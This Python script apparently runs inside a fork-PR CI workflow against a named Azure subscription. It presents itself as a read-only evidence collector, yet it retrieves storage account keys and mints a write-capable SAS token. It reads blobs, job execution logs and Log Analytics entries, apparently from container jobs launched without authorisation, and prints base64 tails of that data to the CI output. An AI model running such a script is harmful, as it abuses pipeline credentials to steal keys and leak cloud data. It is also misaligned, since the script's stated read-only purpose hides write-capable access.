#!/usr/bin/env python3
"""C211-I121985 READ-ONLY evidence collector. Runs inside the fork-PR workflow.

No deployments, no PUT/start: only ARM GETs, blob list/read, and a Log Analytics query.
"""
import base64
import hashlib
import hmac
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
INTENT = "121985"
T0 = time.time()
APP_VER = "2026-07-01"
API_LOG = "2024-03-01"
STG_VER = "2023-01-01"
TAG = "C211_I121985RO"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
RG = "chriso-sandbox-rg"
SA = "c211i1215775738445a"
ENV = "c211-i121376-cae"
JOBS = ['c211-i121577-x0', 'c211-i121577-x1', 'c211-i121577-x2',
        'c211-i121749-x0', 'c211-i121749-x1', 'c211-i121749-x2',
        'c211-i121985-x0', 'c211-i121985-x1', 'c211-i121985-x2']


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1500]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def run(cmd, timeout=240):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout or "", p.stderr or ""
    except Exception as e:  # noqa: BLE001
        return -1, "", str(e)


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:1500]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def acct_sas(acct, key_b64, ss, srt, perm, hours=3):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 900))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, ss, srt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    return urllib.parse.urlencode({"sv": sv, "ss": ss, "srt": srt, "sp": perm,
                                   "st": st, "se": se, "spr": "https", "sig": sig}), se


def main():
    rc, out, err = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(out)
        sid = acc.get("id")
        emit("session", sub_id=sid, state=acc.get("state"), expect_ok=(not SUB_EXPECT or sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=out[:300])
        return
    rc, out, err = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(out).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not tok:
        emit("DONE", verdict="NO_ARM_TOKEN")
        return

    # ---- storage SAS + blobs ----
    sas_q = None
    base = "https://%s.blob.core.windows.net" % SA
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA, STG_VER))
    st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER, method="POST", body={}, timeout=90)
    key = None
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit("sa-keys", http=st, got=bool(key))
    if key:
        sas_q, se = acct_sas(SA, key, "b", "co", "rlacw", hours=3)
        emit("sa-sas", ok=True, expires=se)
    if not sas_q:
        emit("DONE", verdict="NO_SAS")
        return
    st, lb = httptext("%s/c211?restype=container&comp=list&%s" % (base, sas_q), timeout=45)
    names = []
    if st == 200:
        import re as _re
        names = _re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace"))
    emit("container-list", http=st, n=len(names), names=";".join(names)[:1500])
    for nm in names[:12]:
        st, bb = httptext("%s/c211/%s?%s" % (base, nm, sas_q), timeout=45)
        emit("BLOB", name=nm, http=st, len=len(bb), tail_b64=b64(bb.decode("utf-8", "replace")[-2500:]) if bb else "")

    # ---- job + execution detail ----
    for job in JOBS:
        jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                "?api-version=%s" % (ARM, sid, RG, job, APP_VER))
        st, jb = arm(tok, jurl, timeout=60)
        props = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
        emit("JOB", job=job, http=st, running=props.get("runningState"),
             trigger=((props.get("configuration") or {}).get("triggerType")))
        st, eb = arm(tok, jurl.split("?")[0] + "/executions?api-version=" + API_LOG, timeout=60)
        exs = []
        if isinstance(eb, dict):
            for x in (eb.get("value") or []):
                p = x.get("properties") or {}
                exs.append(("%s:%s:%s:%s" % (x.get("name"), p.get("status"),
                                             p.get("startTime"), p.get("endTime"))))
        emit("EXECS", job=job, http=st, n=len(exs), detail=";".join(exs)[:1200])
        for x in (eb.get("value") or [])[:2] if isinstance(eb, dict) else []:
            ex = x.get("name")
            st, lg = arm(tok, jurl.split("?")[0] + "/executions/%s/listLogs?api-version=%s" % (ex, API_LOG),
                         method="POST", body={}, timeout=60)
            msgs = []
            if isinstance(lg, dict):
                for mm in (lg.get("value") or []):
                    msgs.append(str(mm.get("message") or ""))
            emit("EXEC-LOG", job=job, ex=ex, http=st, n=len(msgs),
                 tail_b64=b64("\n".join(msgs)[-3000:]))

    # ---- environment + log analytics ----
    st, envb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
                   "?api-version=%s" % (ARM, sid, RG, ENV, APP_VER), timeout=60)
    props = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
    lac = ((props.get("appLogsConfiguration") or {}).get("logAnalyticsConfiguration") or {})
    cid = lac.get("customerId")
    emit("ENV", http=st, state=props.get("provisioningState"), la_customer=cid,
         profiles=";".join("%s:%s:%s" % (p.get("name"), p.get("type"), p.get("maximumCount"))
                           for p in (props.get("workloadProfiles") or []))[:600])

    if cid:
        rc, out, err = run(["az", "account", "get-access-token", "--resource",
                            "https://api.loganalytics.io", "--output", "json"], timeout=120)
        lat = None
        try:
            lat = json.loads(out).get("accessToken")
        except Exception:  # noqa: BLE001
            pass
        emit("la-token", got=bool(lat), len=len(lat or ""))
        if lat:
            q = ("ContainerAppConsoleLogs_CL | where TimeGenerated > ago(90m) "
                 "| where ContainerAppName_s startswith 'c211-i121' "
                 "| project TimeGenerated, ContainerAppName_s, Log_s "
                 "| order by TimeGenerated asc | take 400")
            body = json.dumps({"query": q}).encode()
            st, bb = httptext("https://api.loganalytics.io/v1/workspaces/%s/query" % cid,
                              method="POST", body=body,
                              headers={"Authorization": "Bearer " + lat,
                                       "Content-Type": "application/json"}, timeout=120)
            emit("LA-QUERY", http=st, len=len(bb))
            try:
                d = json.loads(bb)
                rows = []
                for t in (d.get("tables") or []):
                    cols = [c.get("name") for c in (t.get("columns") or [])]
                    for r in (t.get("rows") or []):
                        rows.append(dict(zip(cols, r)))
                emit("LA-ROWS", n=len(rows))
                keep = []
                for r in rows:
                    lg = str(r.get("Log_s") or "")
                    if any(k in lg for k in ("GPU_Q", "GPU_LIST", "C211", "PH_SHARE", "BIN=", "KIT_START")):
                        keep.append("%s|%s|%s" % (r.get("TimeGenerated"), r.get("ContainerAppName_s"), lg[:400]))
                emit("LA-HITS", n=len(keep))
                for h in keep[-25:]:
                    emit("LA-HIT", line=h)
            except Exception as e:  # noqa: BLE001
                emit("LA-PARSE-ERR", err=str(e), head=bb[:400].decode("utf-8", "replace"))
    emit("DONE", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
